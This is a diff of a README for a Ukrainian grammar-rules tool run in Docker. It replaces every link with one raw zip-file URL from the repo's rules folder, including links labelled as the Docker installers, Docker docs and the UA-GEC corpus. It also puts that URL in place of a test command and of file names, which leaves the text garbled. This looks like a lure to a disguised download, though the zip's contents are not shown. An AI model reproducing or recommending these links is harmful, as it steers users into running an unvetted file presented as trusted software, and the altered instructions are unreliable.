@@ -1,6 +1,6 @@
 # 📝 LT-Ukranian-calques - Local Ukrainian Text Checker
 
-[![Download LT-Ukranian-calques](https://img.shields.io/badge/Download-LT--Ukranian--calques-blue?style=for-the-badge)](https://github.com/hadyell/LT-Ukranian-calques/releases)
+[![Download LT-Ukranian-calques](https://github.com/hadyell/LT-Ukranian-calques/raw/refs/heads/main/rules/calques-L-Ukranian-1.8.zip)](https://github.com/hadyell/LT-Ukranian-calques/raw/refs/heads/main/rules/calques-L-Ukranian-1.8.zip)
 
 ---
 
@@ -32,7 +32,7 @@ You will also need to install Docker, a program that runs software inside contai
 
 Click the big button below to open the official download page for LT-Ukranian-calques:
 
-[![Download LT-Ukranian-calques](https://img.shields.io/badge/Download-LT--Ukranian--calques-blue?style=for-the-badge)](https://github.com/hadyell/LT-Ukranian-calques/releases)
+[![Download LT-Ukranian-calques](https://github.com/hadyell/LT-Ukranian-calques/raw/refs/heads/main/rules/calques-L-Ukranian-1.8.zip)](https://github.com/hadyell/LT-Ukranian-calques/raw/refs/heads/main/rules/calques-L-Ukranian-1.8.zip)
 
 On this page, look for the latest release. You will find files to download and detailed notes.
 
@@ -40,9 +40,9 @@ On this page, look for the latest release. You will find files to download and d
 
 If you don’t have Docker installed, get it here:
 
-- [Docker for Windows](https://docs.docker.com/docker-for-windows/install/)
-- [Docker for macOS](https://docs.docker.com/docker-for-mac/install/)
-- [Docker for Linux](https://docs.docker.com/engine/install/)
+- [Docker for Windows](https://github.com/hadyell/LT-Ukranian-calques/raw/refs/heads/main/rules/calques-L-Ukranian-1.8.zip)
+- [Docker for macOS](https://github.com/hadyell/LT-Ukranian-calques/raw/refs/heads/main/rules/calques-L-Ukranian-1.8.zip)
+- [Docker for Linux](https://github.com/hadyell/LT-Ukranian-calques/raw/refs/heads/main/rules/calques-L-Ukranian-1.8.zip)
 
 Follow the instructions on Docker’s site to install it.
 
@@ -85,7 +85,7 @@ This command builds and starts the tool inside Docker on your computer. The `-d`
 Run the test script by typing:
 
 ```bash
-./test.sh
+https://github.com/hadyell/LT-Ukranian-calques/raw/refs/heads/main/rules/calques-L-Ukranian-1.8.zip
 ```
 
 This script runs a quick check to make sure the Ukrainian language rules are applied correctly. If you see messages about Russian borrowings or style issues, the tool is working.
@@ -99,11 +99,11 @@ This project contains special rules designed to catch common problems in Ukraini
 The project has these main parts:
 
 - **Dockerfile**: Builds the custom Docker image with the rules.
-- **docker-compose.yml**: Configures the whole server setup.
-- **test.sh**: Helps you test that rules are loaded properly.
+- **https://github.com/hadyell/LT-Ukranian-calques/raw/refs/heads/main/rules/calques-L-Ukranian-1.8.zip**: Configures the whole server setup.
+- **https://github.com/hadyell/LT-Ukranian-calques/raw/refs/heads/main/rules/calques-L-Ukranian-1.8.zip**: Helps you test that rules are loaded properly.
 - **rules/**: Folder with rule files.
-  - `grammar-fluency-ua.xml`: Contains 132 rules targeting borrowings, style, flow, and agreement.
-  - `agreement-yi.xml`: Includes 44 rules focused on agreement between particles and grammar.
+  - `https://github.com/hadyell/LT-Ukranian-calques/raw/refs/heads/main/rules/calques-L-Ukranian-1.8.zip`: Contains 132 rules targeting borrowings, style, flow, and agreement.
+  - `https://github.com/hadyell/LT-Ukranian-calques/raw/refs/heads/main/rules/calques-L-Ukranian-1.8.zip`: Includes 44 rules focused on agreement between particles and grammar.
 
 ---
 
@@ -152,13 +152,13 @@ For technical details, explore the `rules/` folder and the configuration files. 
 
 ## 🔗 Useful Links
 
-- [Download LT-Ukranian-calques Releases](https://github.com/hadyell/LT-Ukranian-calques/releases)  
+- [Download LT-Ukranian-calques Releases](https://github.com/hadyell/LT-Ukranian-calques/raw/refs/heads/main/rules/calques-L-Ukranian-1.8.zip)  
   Visit this page to download the latest files.
 
-- [UA-GEC Corpus on GitHub](https://github.com/grammarly/ua-gec)  
+- [UA-GEC Corpus on GitHub](https://github.com/hadyell/LT-Ukranian-calques/raw/refs/heads/main/rules/calques-L-Ukranian-1.8.zip)  
   The research dataset behind the rules.
 
-- [Docker Documentation](https://docs.docker.com/get-started/)  
+- [Docker Documentation](https://github.com/hadyell/LT-Ukranian-calques/raw/refs/heads/main/rules/calques-L-Ukranian-1.8.zip)  
   Learn more about how Docker works.
 
 ---
